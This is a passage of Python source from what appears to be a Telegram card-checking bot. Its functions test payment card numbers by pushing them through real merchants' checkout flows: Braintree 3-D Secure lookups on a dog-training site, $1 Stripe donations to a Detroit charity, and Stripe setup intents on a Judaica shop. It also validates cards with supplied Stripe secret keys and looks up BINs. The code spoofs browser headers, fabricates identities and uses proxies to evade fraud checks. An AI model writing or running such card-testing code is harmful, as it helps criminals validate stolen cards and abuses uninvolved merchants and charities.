            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }
        
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
        
        headers = {
            'authority': 'centinelapi.cardinalcommerce.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-cardinal-tid': 'Tid-9485656a-80d9-4fb0-9090-5f1a55b0d87a',
        }
        
        json_data = {
            'BrowserPayload': {
                'Order': {
                    'OrderDetails': {},
                    'Consumer': {
                        'BillingAddress': {},
                        'ShippingAddress': {},
                        'Account': {},
                    },
                    'Cart': [],
                    'Token': {},
                    'Authorization': {},
                    'Options': {},
                    'CCAExtension': {},
                },
                'SupportsAlternativePayments': {
                    'cca': True,
                    'hostedFields': False,
                    'applepay': False,
                    'discoverwallet': False,
                    'wallet': False,
                    'paypal': False,
                    'visacheckout': False,
                },
            },
            'Client': {
                'Agent': 'SongbirdJS',
                'Version': '1.35.0',
            },
            'ConsumerSessionId': '1_51ec1382-5c25-4ae8-8140-d009e9a0ba7e',
            'ServerJWT': car,
        }
        
        response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
        payload = response.json()['CardinalJWT']
        ali2 = jwt.decode(payload, options={"verify_signature": False})
        reid = ali2['ReferenceId']
        
        headers = {
            'authority': 'geo.cardinalcommerce.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://geo.cardinalcommerce.com',
            'pragma': 'no-cache',
            'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=685f36f8a9cda83f2eeb2dff&tmEventType=PAYMENT&referenceId=1_51ec1382-5c25-4ae8-8140-d009e9a0ba7e&geolocation=false&origin=Songbird',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        json_data = {
            'Cookies': {
                'Legacy': True,
                'LocalStorage': True,
                'SessionStorage': True,
            },
            'DeviceChannel': 'Browser',
            'Extended': {
                'Browser': {
                    'Adblock': True,
                    'AvailableJsFonts': [],
                    'DoNotTrack': 'unknown',
                    'JavaEnabled': False,
                },
                'Device': {
                    'ColorDepth': 24,
                    'Cpu': 'unknown',
                    'Platform': 'Linux armv81',
                    'TouchSupport': {
                        'MaxTouchPoints': 5,
                        'OnTouchStartAvailable': True,
                        'TouchEventCreationSuccessful': True,
                    },
                },
            },
            'Fingerprint': '1224948465f50bd65545677bc5d13675',
            'FingerprintingTime': 980,
            'FingerprintDetails': {
                'Version': '1.5.1',
            },
            'Language': 'ar-EG',
            'Latitude': None,
            'Longitude': None,
            'OrgUnitId': '685f36f8a9cda83f2eeb2dff',
            'Origin': 'Songbird',
            'Plugins': [],
            'ReferenceId': reid,
            'Referrer': 'https://southenddogtraining.co.uk/',
            'Screen': {
                'FakedResolution': False,
                'Ratio': 2.2222222222222223,
                'Resolution': '800x360',
                'UsableResolution': '800x360',
                'CCAScreenSize': '01',
            },
            'CallSignEnabled': None,
            'ThreatMetrixEnabled': False,
            'ThreatMetrixEventType': 'PAYMENT',
            'ThreatMetrixAlias': 'Default',
            'TimeOffset': -180,
            'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'UserAgentDetails': {
                'FakedOS': False,
                'FakedBrowser': False,
            },
            'BinSessionId': '09f2dd83-a00a-42d5-9d89-f2867589860b',
        }
        
        response = r.post(
            'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
            cookies=r.cookies,
            headers=headers,
            json=json_data,
        )
        
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'pragma': 'no-cache',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'd118f7da-b7b0-4b4e-847a-c81bc63dad77',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tok = response.json()['data']['tokenizeCreditCard']['token']
        binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
        
        headers = {
            'authority': 'api.braintreegateway.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'amount': '2.99',
            'additionalInfo': {},
            'bin': binn,
            'dfReferenceId': reid,
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.94.0',
                'cardinalDeviceDataCollectionTimeElapsed': 51,
                'issuerDeviceDataCollectionTimeElapsed': 2812,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': au,
            'braintreeLibraryVersion': 'braintree/web/3.94.0',
            '_meta': {
                'merchantAppId': 'southenddogtraining.co.uk',
                'platform': 'web',
                'sdkVersion': '3.94.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': 'e0de4acd-a40f-46fd-9f4b-ae49eb1ff65f',
            },
        }
        
        response = r.post(
            f'https://api.braintreegateway.com/merchants/twtsckjpfh6g4qqg/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        )
        vbv = response.json()['paymentMethod']['threeDSecureInfo']['status']
        
        if 'authenticate_successful' in vbv or 'authenticate_attempt_successful' in vbv:
            return '3DS Authenticate Attempt Successful'
        elif 'challenge_required' in vbv:
            return '3DS Challenge Required'
        else:
            return vbv
    except Exception as e:
        return f"𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}"

# ================== Stripe Charge Gateway ==================
def stripe_charge(ccx, proxy_dict=None):
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    c = parts[0]
    mm = parts[1]
    ex = parts[2]
    cvc = parts[3]
    
    try:
        yy = ex[2] + ex[3]
        if '2' in ex[3] or '1' in ex[3]:
            yy = ex[2] + '7'
        else:
            pass
    except:
        yy = ex[0] + ex[1]
        if '2' in ex[1] or '1' in ex[1]:
            yy = ex[0] + '7'
        else:
            pass
    
    user = generate_user_agent()
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{username}@gmail.com"
    
    session = requests.session()
    if proxy_dict:
        session.proxies.update(proxy_dict)
    
    headers = {
        'user-agent': user,
    }
    response = session.get(f'https://higherhopesdetroit.org/donation', headers=headers)
    time.sleep(2)
    
    try:
        ssa = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text).group(1)
    except AttributeError:
        return "Failed to extract form data"
    
    headers = {
        'origin': f'https://higherhopesdetroit.org',
        'referer': f'https://higherhopesdetroit.org/donation',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': ssa00,
        'give-form-id': ss000a00,
        'give-form-title': 'Give a Donation',
        'give-current-url': f'https://higherhopesdetroit.org/donation',
        'give-form-url': f'https://higherhopesdetroit.org/donation',
        'give-form-minimum': f'1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': ssa,
        'give-price-id': 'custom',
        'give-amount': f'1.00',
        'give_tributes_type': 'DrGaM Of',
        'give_tributes_show_dedication': 'no',
        'give_tributes_radio_type': 'In Honor Of',
        'give_tributes_first_name': '',
        'give_tributes_last_name': '',
        'give_tributes_would_to': 'send_mail_card',
        'give-tributes-mail-card-personalized-message': '',
        'give_tributes_mail_card_notify_first_name': '',
        'give_tributes_mail_card_notify_last_name': '',
        'give_tributes_address_country': 'US',
        'give_tributes_mail_card_address_1': '',
        'give_tributes_mail_card_address_2': '',
        'give_tributes_mail_card_city': '',
        'give_tributes_address_state': 'MI',
        'give_tributes_mail_card_zipcode': '',
        'give_stripe_payment_method': '',
        'payment-mode': 'stripe',
        'give_first': 'drgam ',
        'give_last': 'drgam ',
        'give_email': 'lolipnp@gmail.com',
        'give_comment': '',
        'card_name': 'drgam ',
        'billing_country': 'US',
        'card_address': 'drgam sj',
        'card_address_2': '',
        'card_city': 'tomrr',
        'card_state': 'NY',
        'card_zip': '10090',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
        'action': 'give_process_donation',
        'give_ajax': 'true',
    }
    
    response = session.post(f'https://higherhopesdetroit.org/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers, data=data)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
    
    e = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    try:
        e_json = e.json()
        if 'id' in e_json:
            payment_id = e_json['id']
        else:
            err = e_json.get('error', {})
            decline_code = err.get('decline_code', '')
            err_code = err.get('code', '')
            err_msg = err.get('message', 'Unknown error')
            if decline_code:
                if 'incorrect_number' in decline_code or 'invalid' in decline_code:
                    return f"Declined ❌ - Invalid Card Number"
                elif 'insufficient_funds' in decline_code:
                    return f"Insufficient Funds 💰"
                elif 'stolen' in decline_code or 'lost' in decline_code:
                    return f"Declined ❌ - Lost/Stolen Card"
                elif 'expired' in decline_code:
                    return f"Declined ❌ - Expired Card"
                else:
                    return f"Declined ❌ - {decline_code}"
            elif err_code:
                if 'incorrect_number' in err_code:
                    return f"Declined ❌ - Incorrect Card Number"
                elif 'invalid_expiry' in err_code:
                    return f"Declined ❌ - Invalid Expiry"
                elif 'invalid_cvc' in err_code:
                    return f"Declined ❌ - Invalid CVC"
                elif 'card_declined' in err_code:
                    return f"Declined ❌ - Card Declined"
                elif 'expired_card' in err_code:
                    return f"Declined ❌ - Expired Card"
                elif 'processing_error' in err_code:
                    return f"Declined ❌ - Processing Error"
                else:
                    return f"Declined ❌ - {err_code}"
            else:
                return f"Declined ❌ - {err_msg[:80]}"
    except:
        return "Declined ❌ - Failed to process card"
    
    headers = {
        'authority': f'https://higherhopesdetroit.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://higherhopesdetroit.org',
        'referer': f'https://higherhopesdetroit.org/donation',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    params = {
        'payment-mode': 'stripe',
        'form-id': ss000a00,
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': ssa00,
        'give-form-id': ss000a00,
        'give-form-title': 'Give a Donation',
        'give-current-url': f'https://higherhopesdetroit.org/donation',
        'give-form-url': f'https://higherhopesdetroit.org/donation',
        'give-form-minimum': f'1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': ssa,
        'give-price-id': 'custom',
        'give-amount': f'1.00',
        'give_tributes_type': 'In Honor Of',
        'give_tributes_show_dedication': 'no',
        'give_tributes_radio_type': 'Drgam Of',
        'give_tributes_first_name': '',
        'give_tributes_last_name': '',
        'give_tributes_would_to': 'send_mail_card',
        'give-tributes-mail-card-personalized-message': '',
        'give_tributes_mail_card_notify_first_name': '',
        'give_tributes_mail_card_notify_last_name': '',
        'give_tributes_address_country': 'US',
        'give_tributes_mail_card_address_1': '',
        'give_tributes_mail_card_address_2': '',
        'give_tributes_mail_card_city': '',
        'give_tributes_address_state': 'MI',
        'give_tributes_mail_card_zipcode': '',
        'give_stripe_payment_method': payment_id,
        'payment-mode': 'stripe',
        'give_first': 'drgam ',
        'give_last': 'drgam ',
        'give_email': 'lolipnp@gmail.com',
        'give_comment': '',
        'card_name': 'drgam ',
        'billing_country': 'US',
        'card_address': 'drgam sj',
        'card_address_2': '',
        'card_city': 'tomrr',
        'card_state': 'NY',
        'card_zip': '10090',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
    }
    
    r4 = session.post(f'https://higherhopesdetroit.org/donation', params=params, cookies=session.cookies, headers=headers, data=data)
    
    if 'Your card was declined.' in r4.text:
        return 'Card Declined'
    elif 'Your card has insufficient funds.' in r4.text:
        return 'Insufficient Funds'
    elif 'Thank you' in r4.text or 'Thank you for your donation' in r4.text or 'succeeded' in r4.text or 'true' in r4.text or 'success' in r4.text or 'success":true,"data":{"status":"succeeded' in r4.text:
        return 'Charge !!'
    elif 'Your card number is incorrect.' in r4.text:
        return 'Incorrect CVV2'
    else:
        return 'Card Reject'

# ================== Stripe Auth Gateway ==================
def stripe_auth(ccx, proxy_dict=None):
    ccx = ccx.strip()
    c = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    DrGaM = requests.Session()
    if proxy_dict:
        DrGaM.proxies.update(proxy_dict)
    uu = generate_user_agent()
    email = f"drt{random.randint(1000,9999)}@gmail.com"
    
    try:
        headers = {
            'authority': 'headwell.org',
            'user-agent': uu,
        }
        
        Mori = DrGaM.get(f'https://mazaltovjudaica.com/my-account/add-payment-method/', headers=headers)
        ft = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', Mori.text).group(1)
        
        headers = {
            'authority': 'headwell.org',
            'user-agent': uu,
        }
        
        Skiplow = {
            'email': email,
            'password': os.environ.get("WOOCOM_PASS", "aaar@123"),
            'wc_order_attribution_user_agent': uu,
            'woocommerce-register-nonce': ft,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }
        
        response = DrGaM.post(f'https://mazaltovjudaica.com/my-account/add-payment-method/', headers=headers, data=Skiplow)
        response = DrGaM.get(f'https://mazaltovjudaica.com/my-account/add-payment-method/', headers=headers)
        
        pkk = re.search(r'(pk_live_[a-zA-Z0-9]+)', response.text).group(1)
        VaG = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        
        headers = {
            'authority': 'api.stripe.com',
            'user-agent': uu,
        }
        
        data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent&key={pkk}'
        response = DrGaM.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        resp_json = response.json()
        if 'id' not in resp_json:
            err = resp_json.get('error', {})
            decline_code = err.get('decline_code', '')
            err_code = err.get('code', '')
            err_msg = err.get('message', 'Unknown error')
            if decline_code:
                if 'incorrect_number' in decline_code or 'invalid' in decline_code:
                    return "Declined - Invalid Card Number"
                elif 'insufficient_funds' in decline_code:
                    return "Insufficient Funds"
                elif 'expired' in decline_code:
                    return "Declined - Expired Card"
                else:
                    return f"Declined - {decline_code}"
            elif err_code:
                if 'incorrect_number' in err_code:
                    return "Declined - Incorrect Card Number"
                elif 'invalid_expiry' in err_code:
                    return "Declined - Invalid Expiry"
                elif 'invalid_cvc' in err_code:
                    return "Declined - Invalid CVC"
                elif 'card_declined' in err_code:
                    return "Declined - Card Declined"
                elif 'expired_card' in err_code:
                    return "Declined - Expired Card"
                else:
                    return f"Declined - {err_code}"
            else:
                return f"Declined - {err_msg[:80]}"
        idf = resp_json['id']
        
        headers = {
            'authority': 'mazaltovjudaica.com',
            'user-agent': uu,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': idf,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': VaG,
        }
        
        r5 = DrGaM.post(f'https://mazaltovjudaica.com/wp-admin/admin-ajax.php', headers=headers, data=data).text
        
        if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
            return 'Declined'
        elif 'success' in r5 or 'Success' in r5:
            return "Approved"
        elif 'funds' in r5 or 'Insufficient' in r5:
            return "Approved - Insufficient"
        elif '"success":true,"data":{"status":"requires_action"' in r5:
            return "Approved Otp"
        elif 'Your card number is incorrect.' in r5:
            return 'CVC Error'
        elif 'do_not_honor' in r5 or 'generic_decline' in r5:
            return 'Declined - Do Not Honor'
        elif 'authentication_required' in r5 or 'requires_action' in r5:
            return 'Approved OTP'
        elif 'incorrect_number' in r5:
            return 'Declined - Incorrect Number'
        elif 'stolen_card' in r5 or 'lost_card' in r5:
            return 'Declined - Lost/Stolen'
        elif 'pickup_card' in r5:
            return 'Declined - Pickup Card'
        elif 'restricted_card' in r5:
            return 'Declined - Restricted'
        elif 'error' in r5.lower() or 'invalid' in r5.lower():
            return f'Declined'
        else:
            snippet = r5.strip()[:60].replace('\n', ' ')
            return f"Unknown - {snippet}"
    except Exception as e:
        return f"Error: {str(e)[:50]}"

# ===============================================================
# SK KEY MANAGEMENT HELPERS
# ===============================================================

def get_user_sk(user_id):
    try:
        with open("data.json", 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data.get(str(user_id), {}).get('sk_key', None)
    except Exception:
        return None

def set_user_sk(user_id, sk_key):
    try:
        with open("data.json", 'r', encoding='utf-8') as f:
            data = json.load(f)
        if str(user_id) not in data:
            data[str(user_id)] = {"plan": "𝗙𝗥𝗘𝗘", "timer": "none"}
        data[str(user_id)]['sk_key'] = sk_key
        with open("data.json", 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except Exception:
        return False

def delete_user_sk(user_id):
    try:
        with open("data.json", 'r', encoding='utf-8') as f:
            data = json.load(f)
        if str(user_id) in data and 'sk_key' in data[str(user_id)]:
            del data[str(user_id)]['sk_key']
            with open("data.json", 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except Exception:
        return False

def stripe_sk_check(ccx, sk_key, proxy_dict=None):
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    if len(parts) < 4:
        return "Invalid card format — use CC|MM|YY|CVV"
    c   = parts[0]
    mm  = parts[1]
    ex  = parts[2]
    cvc = parts[3].strip()

    if len(ex) == 4:
        yy = ex[2:]
    else:
        yy = ex.zfill(2)

    fake = Faker()
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = f"{first_name.lower()}{random.randint(1000,9999)}@gmail.com"
    zip_code = fake.zipcode()

    sess = requests.Session()
    if proxy_dict:
        sess.proxies.update(proxy_dict)

    ua = generate_user_agent()
    auth_headers = {
        'Authorization': f'Bearer {sk_key}',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
    }

    # Step 1: Create payment method using SK key directly
    pm_data = (
        f'type=card'
        f'&billing_details[name]={first_name}+{last_name}'
        f'&billing_details[email]={email}'
        f'&billing_details[address][postal_code]={zip_code}'
        f'&billing_details[address][country]=US'
        f'&card[number]={c}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
    )
    try:
        pm_resp = sess.post('https://api.stripe.com/v1/payment_methods', headers=auth_headers, data=pm_data, timeout=20)
        pm_json = pm_resp.json()
    except Exception as e:
        return f"Error: {str(e)[:50]}"

    if 'error' in pm_json:
        return _parse_stripe_error(pm_json['error'])

    pm_id = pm_json.get('id')
    if not pm_id:
        return "Declined - Could not tokenize card"

    # Step 2: Create + confirm Payment Intent (auth only, capture_method=manual)
    pi_data = (
        f'amount=100'
        f'&currency=usd'
        f'&payment_method={pm_id}'
        f'&confirm=true'
        f'&capture_method=manual'
        f'&description=SK+Auth+Check'
        f'&return_url=https%3A%2F%2Fhackersparadise.com%2Freturn'
    )
    try:
        pi_resp = sess.post('https://api.stripe.com/v1/payment_intents', headers=auth_headers, data=pi_data, timeout=20)
        pi_json = pi_resp.json()
    except Exception as e:
        return f"Error: {str(e)[:50]}"

    if 'error' in pi_json:
        return _parse_stripe_error(pi_json['error'])

    status = pi_json.get('status', '')
    if status == 'requires_capture':
        # Cancel the uncaptured auth immediately to avoid actual charge
        try:
            sess.post(f'https://api.stripe.com/v1/payment_intents/{pi_json["id"]}/cancel', headers=auth_headers, timeout=10)
        except Exception:
            pass
        return "Approved ✅ Auth"
    elif status == 'requires_action' or pi_json.get('next_action'):
        return "3DS Required (Live Card)"
    elif status == 'succeeded':
        amount_val = pi_json.get('amount', 100)
        currency_val = pi_json.get('currency', 'usd').upper()
        try:
            sess.post(f'https://api.stripe.com/v1/payment_intents/{pi_json["id"]}/cancel', headers=auth_headers, timeout=10)
        except Exception:
            pass
        return f"Charged {currency_val} {int(amount_val)/100:.2f}"
    elif status == 'requires_payment_method':
        pi_err = pi_json.get('last_payment_error', {})
        if pi_err:
            return _parse_stripe_error(pi_err)
        return "Card Declined"
    else:
        return f"Declined - {status}" if status else "Card Declined"

# ===============================================================

# Function to get BIN information
def get_bin_info(bin):
    bin6 = str(bin)[:6]

    # ── Primary: lookup.binlist.net ───────────────────────────────
    try:
        r = requests.get(
            f"https://lookup.binlist.net/{bin6}",
            headers={"Accept-Version": "3", "User-Agent": str(generate_user_agent())},
            timeout=7
        )
        if r.status_code == 200:
            d            = r.json()
            scheme       = (d.get("scheme") or "").title()
            brand        = d.get("brand") or scheme or "Unknown"
            card_type    = (d.get("type") or "").capitalize()
            country_obj  = d.get("country") or {}
            country      = country_obj.get("name") or "Unknown"
            country_code = country_obj.get("alpha2") or "N/A"
            bank_obj     = d.get("bank") or {}
            bank         = bank_obj.get("name") or "Unknown"
            bin_info     = f"{brand} - {card_type}" if card_type else brand
            if bin_info == "Unknown" and scheme:
                bin_info = scheme
            return bin_info, bank, country, country_code
    except Exception:
        pass

    # ── Fallback 2: bins.antipublic.cc ───────────────────────────
    try:
        r2 = requests.get(
            f"https://bins.antipublic.cc/bins/{bin6}",
            headers={"User-Agent": str(generate_user_agent())},
            timeout=7
        )
        if r2.status_code == 200:
            d2           = r2.json()
            brand        = (d2.get("brand") or "").title() or "Unknown"
            card_type    = (d2.get("type") or "").title()
            level        = (d2.get("level") or "").title()
            bank         = d2.get("bank") or "Unknown"
            country      = (d2.get("country_name") or "").title() or "Unknown"
            country_code = d2.get("country") or "N/A"
            bin_info     = f"{brand} - {card_type}" if card_type else brand
            if level and level not in bin_info:
                bin_info += f" ({level})"
            return bin_info, bank, country, country_code
    except Exception:
        pass

    # ── Fallback 3: transfunnel.io ────────────────────────────────
    try:
        r3 = requests.post(
            "https://transfunnel.io/projects/chargeback/bin_check.php",
            data=f'{{"bin_number":"{bin6}"}}',
            headers={"User-Agent": str(generate_user_agent())},
            timeout=7
        )
        info = r3.json().get("results") or {}
        if info:
            brand      = info.get("cardBrand") or "Unknown"
            card_type  = info.get("cardType") or ""
            card_cat   = info.get("cardCat") or ""
            bank       = info.get("issuingBank") or "Unknown"
            country    = info.get("countryName") or "Unknown"
            country_code = info.get("countryA2") or "N/A"
            bin_info   = f"{brand} - {card_type} - {card_cat}" if card_cat else f"{brand} - {card_type}"
            return bin_info, bank, country, country_code
    except Exception:
        pass

    return "Unknown", "Unknown", "Unknown", "N/A"

# ================== دوال المساعدة للتشخيص ==================

@bot.message_handler(commands=["myid"])
def show_my_id(message):
    """معرفة ID المستخدم"""
    user_id = message.from_user.id
    bot.reply_to(message, f"<b>معرفك هو: <code>{user_id}</code></b>")

